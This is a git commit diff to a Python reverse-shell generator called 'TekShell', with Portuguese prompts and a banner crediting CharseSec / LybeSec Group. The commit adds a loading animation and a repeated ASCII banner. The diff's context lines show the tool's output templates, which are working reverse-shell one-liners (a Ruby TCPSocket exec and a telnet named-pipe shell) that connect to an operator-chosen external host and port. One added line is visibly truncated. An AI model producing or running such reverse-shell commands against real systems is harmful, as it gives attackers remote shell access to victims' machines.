0a3bac699833b9bddd3f2c5accc73189f1aa54b0
Ch4rse da 404 <107947345+Ch4rse404@users.noreply.github.com>
2023-04-09 05:04:36 -0300

    Update tek2.py

--- modulos/tek2.py
+++ modulos/tek2.py
@@ -2,6 +2,14 @@ import os
 from colorama import init, Fore, Back, Style
 init(autoreset=True)
 
+def animated_marker():
+    widgets = ['\033[94m[\033[97m#\033[94m]\033[97mLoading: ', progressbar.AnimatedMark>
+    bar = progressbar.ProgressBar(widgets=widgets).start()
+               
+    for i in range(50):
+        time.sleep(0.1)
+        bar.update(i)
+
 os.system('cls|clear')
 print("""
             \033[94m [ \033[0m \033[1;37;41mTekShell generator reverse shell \033[0m \033[94m ] \033[0m
@@ -35,6 +43,20 @@ print("")
 print("\033[97m╚══════════════════════════════════════════════╝ ")
 
 shell = input("\033[1;37;41mDIGITE A SHELL COMO OS EXEMPLOS ACIMA >>\033[0m")
+animated_marker()
+               
+os.system('cls|clear')
+print("""
+            \033[94m [ \033[0m \033[1;37;41mTekShell generator reverse shell \033[0m \033[94m ] \033[0m
+            
+\033[1;49;35m████████╗███████╗██╗  ██╗\033[4;49;96m███████╗██╗  ██╗███████╗██╗     ██╗\033[0m
+\033[1;49;35m╚══██╔══╝██╔════╝██║ ██╔╝\033[4;49;96m██╔════╝██║  ██║██╔════╝██║     ██║\033[0m
+\033[1;49;35m   ██║   █████╗  █████╔╝ \033[4;49;96m███████╗███████║█████╗  ██║     ██║\033[0m
+\033[1;49;35m   ██║   ██╔══╝  ██╔═██╗ \033[4;49;96m╚════██║██╔══██║██╔══╝  ██║     ██║\033[0m
+\033[1;49;35m   ██║   ███████╗██║  ██╗\033[4;49;96m███████║██║  ██║███████╗███████╗███████╗\033[0m
+\033[1;49;35m   ╚═╝   ╚══════╝╚═╝  ╚═╝\033[4;49;96m╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝\033[0m
+
+            \033[1;37;41mCodded By: CharseSec\033[0m - \033[1;37;41mLybeSec Group\033[0m""")
 
 print("\033[97m╔══════════════════════════════════════════════╗")
 print("")
@@ -62,6 +84,6 @@ ruby -rsocket -e'f=TCPSocket.open("{ext}",{port}).to_i;exec sprintf("{shell}-i <
 rm -f /tmp/p; mknod /tmp/p p && telnet {ext} {port} 0/tmp/p
 """)
 print("")
-print("\033[97m╔══════════════════════════════════════════════╗")
+print("\033[97m╚══════════════════════════════════════════════╝ ")
 
   
